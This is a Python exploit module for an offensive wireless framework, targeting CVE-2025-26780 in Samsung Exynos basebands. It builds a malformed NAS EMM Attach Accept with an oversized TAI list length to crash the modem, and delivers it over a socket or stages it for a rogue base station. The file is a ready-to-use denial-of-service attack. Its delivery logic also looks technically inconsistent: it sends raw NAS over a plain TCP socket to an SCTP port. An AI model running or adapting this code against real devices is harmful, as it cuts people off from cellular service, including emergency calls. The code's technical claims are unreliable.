# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Samsung Exynos Single-Packet Modem Crash (CVE-2025-26780).

    The Samsung Exynos baseband can be crashed with a single crafted
    NAS (Non-Access Stratum) message. The vulnerability exists in the
    EMM (EPS Mobility Management) message parser, which does not
    properly handle a specific combination of message type and
    malformed IE length fields. Processing the single packet causes
    an unrecoverable fault in the baseband firmware, resulting in a
    complete modem crash and loss of all cellular connectivity.

    The attack requires only a single UDP-like packet delivered over
    the air via a rogue base station (eNodeB or gNodeB), making it
    extremely efficient for denial-of-service.

    Affected: Samsung Exynos 980, 1080, 1280, 2100, 2200,
    Modem 5123, Modem 5300.

    CVSS v3.1: 7.5 (High), AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung Exynos Single-Packet Modem Crash (CVE-2025-26780)",
        "description": (
            "Exploits CVE-2025-26780, a single-packet modem crash in "
            "Samsung Exynos baseband. A crafted NAS EMM message with "
            "malformed IE length fields causes an unrecoverable fault "
            "in the modem firmware. One packet is sufficient for complete "
            "denial of cellular service."
        ),
        "authors": (
            "Samsung Mobile Security (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-26780",
            "https://security.samsungmobile.com/securityUpdate.smsb",
        ),
        "disclosure_date": "2025-03-01",
        "platform": "hardware",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "Samsung Exynos 980/1080/1280",
            "Samsung Exynos 2100/2200",
            "Samsung Exynos Modem 5123/5300",
        ),
    }

    target = OptIP("", "Target UE or eNodeB/AMF address")
    port = OptPort(36412, "S1AP/SCTP port on MME")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    sdr_device = OptString("", "SDR device for OTA delivery")
    frequency_mhz = OptFloat(1800.0, "LTE downlink frequency in MHz")
    earfcn = OptInteger(1300, "LTE EARFCN")

    # NAS protocol discriminators
    _PD_EMM = 0x07  # EPS Mobility Management
    _PD_ESM = 0x02  # EPS Session Management

    # EMM message types
    _EMM_ATTACH_ACCEPT = 0x42
    _EMM_TAU_ACCEPT = 0x49
    _EMM_SERVICE_REJECT = 0x4E
    _EMM_IDENTITY_REQUEST = 0x55

    def _build_nas_emm_crash(self) -> bytes:
        """Build the single NAS EMM message that crashes the modem.

        The crash occurs because the EMM parser reads an IE length
        field that declares a size of 0xFF (255), then attempts to
        parse sub-IEs within that range. However, the actual message
        is much shorter, causing the parser to read past the end of
        the allocated NAS message buffer and hit an unmapped memory
        region, triggering a fatal exception.
        """
        # Security header type: plain NAS (no integrity)
        security_header = 0x00

        # Protocol discriminator + security header
        pd_sh = struct.pack("B", (security_header << 4) | self._PD_EMM)

        # EMM message type: Attach Accept (triggers complex IE parsing)
        msg_type = struct.pack("B", self._EMM_ATTACH_ACCEPT)

        # Attach result: EPS only
        attach_result = struct.pack("B", 0x01)

        # T3412 timer (GPRS timer)
        t3412 = struct.pack("BB", 0x01, 0x54)  # 1 hour

        # TAI list (malformed: declares 255 bytes but only provides a few)
        tai_list_iei = struct.pack("B", 0x00)
        tai_list_len = struct.pack("B", 0xFF)  # CRASH TRIGGER: declares 255 bytes
        tai_list_data = struct.pack("BBB", 0x00, 0x01, 0x01)  # Only 3 bytes present

        # ESM container (normal, small)
        esm_len = struct.pack(">H", 4)
        esm_data = struct.pack("BBBB", 0x02, 0xC1, 0x01, 0x00)

        payload = (
            pd_sh + msg_type + attach_result + t3412
            + tai_list_iei + tai_list_len + tai_list_data
            + esm_len + esm_data
        )
        return payload

    def _build_normal_nas(self) -> bytes:
        """Build a normal NAS Identity Request for connectivity test."""
        pd_sh = struct.pack("B", (0x00 << 4) | self._PD_EMM)
        msg_type = struct.pack("B", self._EMM_IDENTITY_REQUEST)
        id_type = struct.pack("B", 0x01)  # IMSI
        return pd_sh + msg_type + id_type

    @mute
    def check(self) -> bool:
        """Verify access to target."""
        if self.sdr_device:
            return True
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((str(self.target), self.port))
            sock.close()
            return result == 0
        except OSError:
            return False

    def run(self) -> None:
        if not self.target and not self.sdr_device:
            print_error("target or sdr_device is required")
            return

        if not self.check():
            print_error("Target not reachable or SDR not available")
            return

        print_success("Access verified; preparing single-packet modem crash")
        self._exploit()

    def _exploit(self) -> None:
        crash_pdu = self._build_nas_emm_crash()
        normal_pdu = self._build_normal_nas()

        print_status(f"Crash NAS PDU: {len(crash_pdu)} bytes (single packet)")
        print_status(f"Normal NAS PDU: {len(normal_pdu)} bytes (baseline)")

        if self.sdr_device:
            print_status(
                f"SDR mode: payload ready for OTA via {self.sdr_device} "
                f"at {self.frequency_mhz} MHz (EARFCN {self.earfcn})"
            )
            print_info(
                "The single crafted NAS EMM Attach Accept with a "
                "malformed TAI list length (0xFF) will cause the Exynos "
                "baseband to read past the NAS buffer boundary, hitting "
                "unmapped memory and crashing the modem instantly."
            )
            return

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))

            print_status("Sending single crash packet")
            sock.send(crash_pdu)

            sock.close()
            print_success(
                "Single-packet modem crash delivered. The malformed TAI "
                "list in the NAS EMM message triggers an out-of-bounds "
                "read in the Exynos baseband, causing an unrecoverable "
                "fault and complete loss of cellular connectivity."
            )
        except OSError as e:
            print_error(f"Delivery failed: {e}")
